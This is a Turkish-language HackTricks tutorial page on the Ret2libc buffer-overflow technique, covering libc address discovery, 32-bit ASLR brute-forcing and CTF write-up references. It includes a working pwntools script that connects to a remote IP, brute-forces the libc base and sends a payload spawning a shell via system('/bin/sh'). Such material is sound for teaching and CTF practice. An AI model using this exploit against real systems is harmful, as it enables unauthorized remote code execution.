# Ret2lib

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**Ret2Libc**'nin özü, zayıf bir programın yürütme akışını, saldırgan tarafından sağlanan shellcode'un yığında yürütülmesi yerine, paylaşılan bir kütüphane içindeki bir işlevine yönlendirmektir (örneğin, **system**, **execve**, **strcpy**). Saldırgan, geri dönüş adresini değiştiren bir yük oluşturur ve yığında istenen kütüphane işlevine işaret edecek şekilde ayarlar, aynı zamanda çağrı konvansiyonuna göre gerekli argümanların da doğru şekilde ayarlanmasını sağlar.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini alın (örneğin, system) ve çağrılacak komutu alın (örneğin, /bin/sh)
* İlk argümanı komut dizinine işaret edecek şekilde ve yürütme akışını işleve geçirecek şekilde ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, nerede bellekte yükleneceğini aşağıdaki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'nin libc adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc bilindiğinde, `system` işlevine olan ofseti bulmak da mümkündür:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc bilindiğinde, `/bin/sh` dizesinin işlevine olan ofseti bulmak da mümkündür:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc bilindiğinde, Peda veya GEF kullanılarak **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini elde etmek de mümkündür:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer işlem her konuştuğunuzda (ağ sunucusu) **çocuklar** oluşturuyorsa, o dosyayı **okumaya** çalışın (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğu için **nerede yükleneceğini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (853).png>)

Bu durumda **0xb75dc000** adresine yüklendi (Bu libc'nin taban adresi olacaktır)

## Bilinmeyen libc

Binary'nin yüklediği libc'yi **bilmediğiniz olabilir** (çünkü erişiminiz olmayan bir sunucuda olabilir). Bu durumda zafiyeti **sızdırmak için kullanabilir ve hangi libc** kütüphanesinin kullanıldığını bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonunu bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasını kontrol edin ve libc içindeki fonksiyonların **bir çift adresini** kullanarak **kullanılan sürümü** bulun.

## 32 bit ASLR'yi Atlatma

Bu brute-force saldırıları **yalnızca 32 bit sistemler için** kullanışlıdır.

* Saldırı yerel ise, libc'nin taban adresini brute-force etmeyi deneyebilirsiniz (32 bit sistemler için kullanışlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuyu hedef alıyorsanız, `libc` fonksiyonu `usleep`'in adresini **10** (örneğin) argümanı olarak geçerek **brute-force** yöntemini deneyebilirsiniz. Eğer sunucu **cevap vermek için 10 saniye daha fazla zaman alıyorsa**, bu fonksiyonun adresini buldunuz demektir.

## Tek Gadget

`libc` içinde **belirli bir adrese** sadece atlayarak bir kabuk çalıştırın:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kod içine entegre edilmiş ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol etmek için:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Örneği

ARM64 durumunda, ret komutu x30 kaydının işaret ettiği yere atlar ve yığın kaydının işaret ettiği yere değil. Bu nedenle biraz daha karmaşıktır.

Ayrıca ARM64'te bir komut, ne yapması gerekiyorsa onu yapar (komutların ortasına atlayıp onları yeni komutlara dönüştürmek mümkün değildir).

Örneği kontrol etmek için:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Printf'e Ret

Bu, `printf`/`puts`'ı belirli bir veriyle bir argüman olarak çağırarak işlemdeki bilgileri sızdırmayı sağlar. Örneğin, GOT'taki `puts` adresini `puts`'ın bir yürütülmesine yerleştirmek, bellekteki `puts` adresini sızdıracaktır.

## Ret2printf

Bu temelde, bir `Ret2lib`'i kullanarak bir `printf` format dizesi güvenlik açığına dönüştürmek anlamına gelir, `ret2lib`'i kullanarak onu sömürmek için `printf`'i çağırmak ve sömürmek için değerlerle kullanmak (anlamsız görünse de mümkündür):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Diğer Örnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc'teki bir işlevin adresine sızıntı verildiğinde, tek bir araç kullanarak
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE etkin değil, ilk adım bir taşma oluşturup canary'nin 0x00 baytına kadar doldurmak ve ardından puts'u çağırıp sızdırmaktır. Canary ile puts'un GOT'tan adresini sızdırmak için bir ROP aracı oluşturulur ve ardından `/bin/sh` adresiyle `system('/bin/sh')` çağırmak için bir ROP aracı oluşturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyonda bir çocuk fonksiyonundan yığın taşması. Puts'u çağırmak için ROP aracı oluşturup GOT'tan puts'un adresini sızdırmak ve ardından bir ROP aracı çağırmak için ROP aracı oluşturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, canary yok, relro yok, nx. Write işlevini kullanarak write (libc) adresini sızdırmak ve bir araç çağırmak için kullanır.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Stack'ten canary'yi sızdırmak için bir format dizesi kullanır ve bir taşma oluşturarak system'i (GOT'ta) `/bin/sh` adresiyle çağırmak için bir araç oluşturur.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, canary yok, nx, pie. Bir sızıntı oluşturmak için kötü bir dizinlemeyi kötüye kullanır ve yığından libc ve heap adreslerini sızdırmak için kötüye kullanır. Buffer taşmasını kötüye kullanarak `system('/bin/sh')` çağırmak için ret2lib yapar (bir kontrolü atlamak için heap adresine ihtiyaç vardır).
